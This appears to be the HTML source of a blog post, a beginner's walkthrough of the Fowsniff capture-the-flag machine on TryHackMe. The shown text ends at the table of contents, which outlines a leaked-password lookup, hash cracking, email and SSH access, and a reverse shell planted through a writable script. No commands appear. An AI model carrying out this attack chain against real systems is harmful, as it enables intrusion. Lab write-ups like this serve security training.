@@ -1,0 +1,1797 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>Fowsniff &middot; HushKat&#39;s Cyber Den</title>
+    <meta name="title" content="Fowsniff &middot; HushKat&#39;s Cyber Den">
+
+  
+  <meta name="description" content="A beginner-friendly Boot2Root machine from THM.">
+  <meta name="keywords" content="THM,TryHackMe,NMAP,POP3,IMAP,SSH,Hash Cracking,Hydra,LinPEAS,easy,boot2root,B2R,OSINT,Google Dorking,Privilege Escalation,Reverse Shell,Email Enumeration,">
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/2025-08-22-fowsniff/">
+  
+  
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.f875dda8a6dc16f33adb8873681506c07444631be7e42b7575718d40698db0db7cd237ac4306f361ed9daaa2f828ff344a9fc7f845cf0217dcbc9360d395f0f9.css"
+    integrity="sha512-&#43;HXdqKbcFvM624hzaBUGwHREYxvn5Ct1dXGNQGmNsNt80jesQwbzYe2dqqL4KP80Sp/H&#43;EXPAhfcvJNg05Xw&#43;Q==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.f99aa39bcfb5d16a28ec2236bd358df5e465058a67f58b42534a3b15882a6a3513791fd27248c6b5b5cef06337f714070d4784fb776f44d930309b64cce1a2e0.js"
+      integrity="sha512-&#43;Zqjm8&#43;10Woo7CI2vTWN9eRlBYpn9YtCU0o7FYgqajUTeR/SckjGtbXO8GM39xQHDUeE&#43;3dvRNkwMJtkzOGi4A=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/posts/2025-08-22-fowsniff/">
+  <meta property="og:site_name" content="HushKat&#39;s Cyber Den">
+  <meta property="og:title" content="Fowsniff">
+  <meta property="og:description" content="A beginner-friendly Boot2Root machine from THM.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-22T01:09:33+03:00">
+    <meta property="article:modified_time" content="2025-08-22T01:09:33+03:00">
+    <meta property="article:tag" content="THM">
+    <meta property="article:tag" content="TryHackMe">
+    <meta property="article:tag" content="NMAP">
+    <meta property="article:tag" content="POP3">
+    <meta property="article:tag" content="IMAP">
+    <meta property="article:tag" content="Ssh">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Fowsniff">
+  <meta name="twitter:description" content="A beginner-friendly Boot2Root machine from THM.">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Fowsniff",
+    "headline": "Fowsniff",
+    "description": "A beginner-friendly Boot2Root machine from THM.",
+    "abstract": "\u003ch1 class=\u0022relative group\u0022\u003eFowsniff CTF - Complete Beginner\u0026rsquo;s Walkthrough \n    \u003cdiv id=\u0022fowsniff-ctf---complete-beginners-walkthrough\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\u0022 href=\u0022#fowsniff-ctf---complete-beginners-walkthrough\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h1\u003e\n\n\u003ch2 class=\u0022relative group\u0022\u003eWhat is This? \n    \u003cdiv id=\u0022what-is-this\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\u0022 href=\u0022#what-is-this\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h2\u003e\n\u003cp\u003e\u003cstrong\u003eFowsniff\u003c\/strong\u003e is a beginner-friendly boot2root CTF (Capture The Flag) challenge hosted on TryHackMe. In this challenge, we\u0026rsquo;ll learn fundamental penetration testing skills by exploiting a vulnerable Linux machine to gain root access and capture the flag.\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/2025-08-22-fowsniff\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-08-22T01:09:33\u002b03:00",
+    "datePublished": "2025-08-22T01:09:33\u002b03:00",
+    
+    "dateModified": "2025-08-22T01:09:33\u002b03:00",
+    
+    "keywords": ["THM","TryHackMe","NMAP","POP3","IMAP","SSH","Hash Cracking","Hydra","LinPEAS","easy","boot2root","B2R","OSINT","Google Dorking","Privilege Escalation","Reverse Shell","Email Enumeration"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2438"
+  }]
+  </script>
+
+
+
+  
+  
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+    
+    
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium">
+          HushKat&rsquo;s Cyber Den
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/posts/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Posts">
+    Blog
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/categories/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Categories">
+    Categories
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/tags/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Tags">
+    Tags
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/about/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="About">
+    About
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="https://twitter.com/dr0idbot"
+  target="_blank"
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+    <span >
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
+    </span>
+  
+  <p class="text-base font-medium" title="">
+    
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="https://github.com/hushkat"
+  target="_blank"
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+    <span >
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span>
+    </span>
+  
+  <p class="text-base font-medium" title="">
+    
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+    
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Posts">
+      Blog
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/categories/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Categories">
+      Categories
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/tags/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Tags">
+      Tags
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/about/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="About">
+      About
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="https://twitter.com/dr0idbot"
+    
+      target="_blank"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+      <div >
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
+      </div>
+    
+    <p class="text-bg font-bg" title="">
+      
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="https://github.com/hushkat"
+    
+      target="_blank"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+      <div >
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span>
+      </div>
+    
+    <p class="text-bg font-bg" title="">
+      
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Fowsniff
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-08-22T01:09:33&#43;03:00">22 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>2438 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-is-this">What is This?</a></li>
+    <li><a href="#prerequisites">Prerequisites</a></li>
+    <li><a href="#lab-setup">Lab Setup</a>
+      <ul>
+        <li><a href="#starting-the-machine">Starting the Machine</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-1-reconnaissance--enumeration">Phase 1: Reconnaissance &amp; Enumeration</a>
+      <ul>
+        <li><a href="#what-is-reconnaissance">What is Reconnaissance?</a></li>
+        <li><a href="#step-1-network-scanning-with-nmap">Step 1: Network Scanning with Nmap</a></li>
+        <li><a href="#step-2-web-application-investigation">Step 2: Web Application Investigation</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-2-osint-open-source-intelligence">Phase 2: OSINT (Open Source Intelligence)</a>
+      <ul>
+        <li><a href="#what-is-osint">What is OSINT?</a></li>
+        <li><a href="#step-3-google-dorking-discovery">Step 3: Google Dorking Discovery</a></li>
+        <li><a href="#step-4-analyzing-the-password-dump">Step 4: Analyzing the Password Dump</a></li>
+        <li><a href="#step-5-cracking-password-hashes">Step 5: Cracking Password Hashes</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-3-email-protocol-exploitation">Phase 3: Email Protocol Exploitation</a>
+      <ul>
+        <li><a href="#what-is-pop3">What is POP3?</a></li>
+        <li><a href="#step-6-connecting-to-the-pop3-service">Step 6: Connecting to the POP3 Service</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-4-ssh-access">Phase 4: SSH Access</a>
+      <ul>
+        <li><a href="#what-is-ssh">What is SSH?</a></li>
+        <li><a href="#step-7-finding-who-still-uses-the-default-password">Step 7: Finding Who Still Uses the Default Password</a></li>
+        <li><a href="#step-8-ssh-connection">Step 8: SSH Connection</a></li>
+      </ul>
+    </li>
+    <li><a href="#phase-5-privilege-escalation">Phase 5: Privilege Escalation</a>
+      <ul>
+        <li><a href="#what-is-privilege-escalation">What is Privilege Escalation?</a></li>
+        <li><a href="#step-9-system-enumeration-with-linpeas">Step 9: System Enumeration with LinPEAS</a></li>
+        <li><a href="#step-10-analyzing-the-writable-script">Step 10: Analyzing the Writable Script</a></li>
+        <li><a href="#step-11-creating-a-reverse-shell">Step 11: Creating a Reverse Shell</a></li>
+        <li><a href="#step-12-triggering-the-reverse-shell">Step 12: Triggering the Reverse Shell</a></li>
+        <li><a href="#step-13-capturing-the-flag">Step 13: Capturing the Flag</a></li>
+      </ul>
